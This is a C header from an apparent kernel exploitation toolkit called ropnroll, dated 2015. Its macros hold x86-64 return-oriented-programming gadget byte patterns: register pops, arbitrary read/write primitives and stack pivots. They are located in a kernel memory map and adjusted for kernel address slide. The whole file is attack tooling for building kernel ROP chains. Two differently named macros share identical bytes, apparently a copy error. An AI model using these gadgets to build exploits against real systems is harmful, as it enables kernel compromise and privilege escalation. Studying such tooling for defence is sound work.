//
//  rnr_gadgets.h
//  ropnroll_final
//
//  Created by jndok on 26/11/15.
//  Copyright © 2015 jndok. All rights reserved.
//

/*
* Again, a special thanks to @qwertyoruiop.
* He provided the majority of these gadgets,
* saving me the huge effort to find them.
*/

#ifndef rnr_gadgets_h
#define rnr_gadgets_h

#include "../ropnroll.h"
#include "../ropnroll_macros.h"

typedef const char* gadget_t;
typedef const size_t gadget_size_t;

#define RNR_GENERIC_GADGET(map, gadget, size) kslide!=KSLIDE_UNKNOWN ? RNR_SLIDE_POINTER(rnr_locate_kernel_base(map)+rnr_locate_gadget_in_map(map, gadget, size)) : rnr_locate_kernel_base(map)+rnr_locate_gadget_in_map(map, gadget, size)

/* custom gadgets */

//use this to search and slide a custom gadget. be sure to get parameters right!
//example:
//  char gadg[] = {0x90, 0xC3};
//  RNR_CUSTOM_GADGET(map, gadg, sizeof(gadg));
#define RNR_CUSTOM_GADGET(map, gadget, size) RNR_GENERIC_GADGET(map, gadget, size)

/* registers gadgets */
#define RNR_POP_RAX(map) RNR_GENERIC_GADGET(map, (char*)((uint8_t[]){0x58, 0xC3}), 2)
#define RNR_POP_RBX(map) RNR_GENERIC_GADGET(map, (char*)((uint8_t[]){0x5B, 0xC3}), 2)
#define RNR_POP_RCX(map) RNR_GENERIC_GADGET(map, (char*)((uint8_t[]){0x59, 0xC3}), 2)
#define RNR_POP_RDX(map) RNR_GENERIC_GADGET(map, (char*)((uint8_t[]){0x5A, 0xC3}), 2)

#define RNR_POP_RSP(map) RNR_GENERIC_GADGET(map, (char*)((uint8_t[]){0x5C, 0xC3}), 2)
#define RNR_POP_RBP(map) RNR_GENERIC_GADGET(map, (char*)((uint8_t[]){0x5D, 0xC3}), 2)
#define RNR_POP_RSI(map) RNR_GENERIC_GADGET(map, (char*)((uint8_t[]){0x5E, 0xC3}), 2)
#define RNR_POP_RDI(map) RNR_GENERIC_GADGET(map, (char*)((uint8_t[]){0x5F, 0xC3}), 2)
#define RNR_POP_RSP_RBP(map) RNR_GENERIC_GADGET(map, (char*)((uint8_t[]){0x5C, 0x5D, 0xC3}), 3)
#define RNR_RSI_TO_RAX(map) RNR_GENERIC_GADGET(map, (char*)((uint8_t[]){0x55, 0x48, 0x89, 0xE5, 0x48, 0x89, 0xF0, 0x5D, 0xC3}), 9)

#define RNR_RAX_TO_RDI_POP_RBP_JMP_RCX(map) RNR_GENERIC_GADGET(map, (char*)((uint8_t[]){0x48, 0x89, 0xC7, 0x5D, 0xFF, 0xE1}), 6)

/* read/write gadgets */
#define RNR_READ_RAX_TO_RAX_POP_RBP(map) RNR_GENERIC_GADGET(map, (char*)((uint8_t[]){0x48, 0x8B, 0x00, 0x5D, 0xC3}), 5)

#define RNR_WRITE_RDX_WHAT_RCX_WHERE_POP_RBP(map) RNR_GENERIC_GADGET(map, (char*)((uint8_t[]){0x48, 0x89, 0x11, 0x5D, 0xC3}), 5)
#define RNR_WRITE_RAX_WHAT_RDX_WHERE_POP_RBP(map) RNR_GENERIC_GADGET(map, (char*)((uint8_t[]){0x48, 0x89, 0x02, 0x5D, 0xC3}), 5)

/* utility gadgets */
#define RNR_NOP(map) RNR_GENERIC_GADGET(map, (char*)((uint8_t[]){0x90, 0xC3}), 2)

/* stack pivoting gadgets */
#define RNR_PIVOT_RAX(map) RNR_GENERIC_GADGET(map, (char*)((uint8_t[]){0x50, 0x01, 0x00, 0x00, 0x5b, 0x41, 0x5c, 0x41, 0x5e, 0x41, 0x5F, 0x5D, 0xC3}), 13)
#define RNR_POP_R14_R15_RBP(map) RNR_GENERIC_GADGET(map, (char*)((uint8_t[]){0x50, 0x01, 0x00, 0x00, 0x5b, 0x41, 0x5c, 0x41, 0x5e, 0x41, 0x5F, 0x5D, 0xC3}), 13)
#define RNR_R14_TO_RCX_CALL_pRAX(map) RNR_GENERIC_GADGET(map, (char*)((uint8_t[]){0x4C,0x89,0xF1,0xFF, 0x10}), 5)
#define RNR_R14_TO_RDI_CALL_pRAX(map) RNR_GENERIC_GADGET(map, (char*)((uint8_t[]){0x4C, 0x89, 0xF7, 0xFF, 0x10}), 5)
#define RNR_AND_RCX_RAX_POP_RBP(map) RNR_GENERIC_GADGET(map, (char*)((uint8_t[]){0x48, 0x21, 0xC8, 0x5D, 0xC3}), 5)
#define RNR_OR_RCX_RAX_POP_RBP(map) RNR_GENERIC_GADGET(map, (char*)((uint8_t[]){0x48, 0x09, 0xC8, 0x5D, 0xC3}), 5)

#define RNR_XCHG_ESP_EAX(map) RNR_GENERIC_GADGET(map, (char*)((uint8_t[]){0x94, 0xc3}), 2)

/***/

__attribute__((always_inline)) uint32_t rnr_calculate_gadget_size(gadget_t gadget);
__attribute__((always_inline)) void rnr_dump_gadget(gadget_t gadget, gadget_size_t gadget_size);
__attribute__((always_inline)) uint64_t rnr_locate_gadget_in_map(gadget_map_t *map, gadget_t gadget, gadget_size_t sz);
__attribute__((always_inline)) uint64_t *rnr_locate_gadget_group_in_map(gadget_map_t *map, gadget_t gadget, gadget_size_t sz, uint32_t occurrences);

#endif /* rnr_gadgets_h */
